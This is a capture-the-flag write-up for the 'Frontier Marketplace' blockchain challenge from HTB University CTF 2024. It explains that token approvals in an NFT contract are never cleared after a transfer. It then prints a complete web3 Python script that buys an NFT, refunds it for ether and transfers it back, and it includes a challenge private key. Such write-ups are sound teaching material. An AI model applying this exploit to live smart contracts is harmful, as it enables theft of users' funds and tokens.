---
title: "Frontier Marketplace - HTB University CTF 2024: Binary Badlands"
category: "blockchain"
type: "writeup"
tags: ["blockchain", "frontier", "marketplace", "htb-university-ctf-2024-binary", "htb-university-ctf-2024-binary-bad", "2024", "ctf-writeup"]
summary: "HTB UNIVERSITY CTF BINARY BADLANDS"
source:
  name: "CTFtime writeup #39701"
  url: "https://ctftime.org/writeup/39701"
original_source: "https://lape.si/writeups/binarybadlands/frontiermarketplace"
ctf:
  name: "HTB University CTF 2024: Binary Badlands"
  year: 2024
  challenge: "Frontier Marketplace"
---

## Metadata

- **CTF:** HTB University CTF 2024: Binary Badlands
- **Task:** Frontier Marketplace
- **Author team:** Platypwnies
- **CTFtime:** <https://ctftime.org/writeup/39701>
- **Original writeup:** <https://lape.si/writeups/binarybadlands/frontiermarketplace>

---
* [HOME](https://lape.si/)
  * [ABOUT](https://lape.si/about)
  * [WRITEUPS](https://lape.si/writeups)
  * [LOGIN](https://lape.si/login)


![](https://lape.si/files/writeups/binarybadlands/background.jpg)

HTB UNIVERSITY CTF BINARY BADLANDS

2024

FrontierMarketplace

In the lawless expanses of the Frontier Board, digital assets hold immense value and power. Among these assets, the FrontierNFTs are the most sought-after, representing unique and valuable items that can influence the balance of power within the cluster. This government has managed to win a lot of approval and consensus from the people, through a strong propaganda campaign through their FrontierNFT which is receiving a lot of demand. Your goal is to somehow disrupt the political ride of the Frontier Board party.

Blockchain

975 points

#### Walkthrough

We start by downloading the provided [files](https://lape.si/files/writeups/binarybadlands/frontiermarketplace/blockchain_frontiermarketplace.zip).

We are given 3 files: 

Setup.sol

, 

FrontierMarketplace.sol

, and 

FrontierNFT.sol

.

Additionally, we are provided with two endpoints. One can be accessed with 

nc

, which provides a simple interface to interact with the challenge. We can use this to get our secret key, the marketplace contract address, and the setup contract address, and we can reset the challenge and get the flag if we solved the challenge.

The other endpoint points to the blockchain.

Let's start by examining the provided files:

Setup.sol

defines how much money we have and what the price of the NFT is.

```
    uint256 public constant PLAYER_STARTING_BALANCE = 20 ether;
    uint256 public constant NFT_VALUE = 10 ether;
```

It also defines the winning condition:

```
    function isSolved() public view returns (bool) {
        return (
            address(msg.sender).balance > PLAYER_STARTING_BALANCE - NFT_VALUE && 
            FrontierNFT(TARGET.frontierNFT()).balanceOf(msg.sender) > 0
        );
    }
```

This means we win, if our nft balance and real balance together are greater than 20 ether. And we need to have at least one NFT. So one way to win would be to have a balance of 20 ether and 1 NFT.

Let's look at the 

FrontierMarketplace.sol

file. It allows us to buy an NFT and to refund it:

```
    function buyNFT() public payable returns (uint256) {
        require(msg.value == TOKEN_VALUE, "FrontierMarketplace: Incorrect payment amount");
        uint256 tokenId = frontierNFT.mint(msg.sender);
        emit NFTMinted(msg.sender, tokenId);
        return tokenId;
    }
    
    function refundNFT(uint256 tokenId) public {
        require(frontierNFT.ownerOf(tokenId) == msg.sender, "FrontierMarketplace: Only owner can refund NFT");
        frontierNFT.transferFrom(msg.sender, address(this), tokenId);
        payable(msg.sender).transfer(TOKEN_VALUE);
        emit NFTRefunded(msg.sender, tokenId);
    }
```

To buy an NFT, we need the correct amount of ether and to refund an NFT, we need to be its owner.

Finally, let's look at the 

FrontierNFT.sol

file. It defines a lot of functions that are used to handle the NFTs.

Functions like 

balanceOf

, 

ownerOf

,... are short and look like there is nothing wrong with them.

However, the 

transferFrom

function is interesting:

```
    function transferFrom(address from, address to, uint256 tokenId) public {
        require(to != address(0), "FrontierNFT: invalid transfer receiver");
        require(from == ownerOf(tokenId), "FrontierNFT: transfer of token that is not own");
        require(
            msg.sender == from || isApprovedForAll(from, msg.sender) || msg.sender == getApproved(tokenId),
            "FrontierNFT: transfer caller is not owner nor approved"
        );
    
        _balances[from] -= 1;
        _balances[to] += 1;
        _owners[tokenId] = to;
    
        emit Transfer(from, to, tokenId);
    }
```

It requires that the token is only transferred from the owner, which looks good. But it doesn't require that the owner is the one who calls the function. We just need to fulfill one of the three requirements:

1\. The caller is the owner

2\. The caller is approved for all

3\. The caller is approved for the specific token

Let's look at the approve functions:

```
    function approve(address to, uint256 tokenId) public {
        address owner = ownerOf(tokenId);
        require(msg.sender == owner, "FrontierNFT: approve caller is not the owner");
        _tokenApprovals[tokenId] = to;
        emit Approval(owner, to, tokenId);
    }
    
    function setApprovalForAll(address operator, bool approved) public {
        require(operator != address(0), "FrontierNFT: invalid operator");
        _operatorApprovals[msg.sender][operator] = approved;
        emit ApprovalForAll(msg.sender, operator, approved);
    }
```

We can see that both functions require that the caller is the owner of the token. However, nothing ever clears the approvals. This means that if we approve an address for a token, it will stay approved forever. If we buy a token we can approve the marketplace for all tokens to be able to refund the token later. We can also approve ourselves directly for the token. This lets us transfer the token to ourselves at any time.

It is probably clear now how we can solve the challenge. We buy a token, approve the marketplace for all tokens, and ourselves for this token. Then we refund the token and steal it back.

To do that we need the address of the frontierNFT contract. This is no problem, because the marketplace exposes it:

```
    FrontierNFT public frontierNFT;
```

Let's do this using 

python

and 

web3

. But first we need to get the ABI of the contracts. We can get them using the online IDE named [Remix](https://remix.ethereum.org/).

You can download the abi file [here](https://lape.si/files/writeups/binarybadlands/frontiermarketplace/abi.py) and the python script [here](https://lape.si/files/writeups/binarybadlands/frontiermarketplace/solve.py).

It contains the following code, which will do exactly what we described above:

```
    from web3 import Web3, AsyncWeb3
    from abi import SETUP_ABI, MARKETPLACE_ABI, NFT_ABI
    
    
    PRIVATE_KEY = "0x395cab72bd7776ad84ac36f290f2b2bdf533f44557cf1bab664c04e3771f59fe"
    TARGET_CONTRACT = "0x76b931C5938E54953978e7318DFcBeA7609a05c1"
    SETUP_CONTRACT = "0xa7e9b7621Fd4dea2F5A8cFC15155156c7e52BCCC"
    
    def print_balance(w3: Web3, account: str) -> None:
        balance = w3.eth.get_balance(account) / 10**18
        print(f"Balance of {account}: {balance}")
    
    # Connect to the blockchain
    w3 = Web3(Web3.HTTPProvider('http://83.136.254.33:55286'))
    # Test the connection
    connection_status = w3.is_connected()
    print(f"Connected to the blockchain: {connection_status}")
    
    # Add account from private key
    account = w3.eth.account.from_key(PRIVATE_KEY)
    print(f"Account: {account.address}")
    
    # Check the balance
    print_balance(w3, account.address)
    
    setup_contract = w3.eth.contract(address=SETUP_CONTRACT, abi=SETUP_ABI)
    print(f"Setup contract: {setup_contract}")
    
    # Load the contract
    contract = w3.eth.contract(address=TARGET_CONTRACT, abi=MARKETPLACE_ABI)
    print(f"Contract: {contract}")
    
    # list all the functions of the contract
    functions = contract.all_functions()
    print(f"Functions: {functions}")
    
    
    # Get the FrontierNFT address from the FrontierMarketplace contract
    frontier_nft_address = contract.functions.frontierNFT().call()
    print(f"FrontierNFT contract address: {frontier_nft_address}")
    
    # Create a contract instance for FrontierNFT
    frontier_nft = w3.eth.contract(address=frontier_nft_address, abi=NFT_ABI)
    
    # buy the NFT
    token_id = contract.functions.buyNFT().call({'value': 10 * 10**18, 'from': account.address})
    print(f"buy_nft: {token_id}")
    # transact
    tx_hash = contract.functions.buyNFT().transact({'value': 10 * 10**18, 'from': account.address})
    print(f"tx_hash: {tx_hash.hex()}")
    
    # print the balance
    print_balance(w3, account.address)
    
    # approve nft to refund
    approve_txn = frontier_nft.functions.setApprovalForAll(TARGET_CONTRACT, True).transact({'from': account.address})
    print(f"approve_txn: {approve_txn}")
    
    # approve the NFT to steal
    approve_txn = frontier_nft.functions.approve(account.address, token_id).transact({'from': account.address})
    print(f"approve_txn: {approve_txn}")
    
    # refund the NFT
    refund_nft = contract.functions.refundNFT(token_id).call({'from': account.address})
    print(f"refund_nft: {refund_nft}")
    # transact
    tx_hash = contract.functions.refundNFT(token_id).transact({'from': account.address})
    print(f"tx_hash: {tx_hash.hex()}")
    
    # steal nft back from marketplace
    transfer_txn = frontier_nft.functions.transferFrom(TARGET_CONTRACT, account.address, token_id).transact({'from': account.address})
    
    # print the balance
    print_balance(w3, account.address)
    # check nft balance
    balance = frontier_nft.functions.balanceOf(account.address).call()
    print(f"balance: {balance}")
```

After running the script, we have 20 ether and 1 NFT in our account.

We can now interact with the interface on the other endpoint to get the flag.

Was this helpful?

[Back](https://lape.si/writeups/binarybadlands)
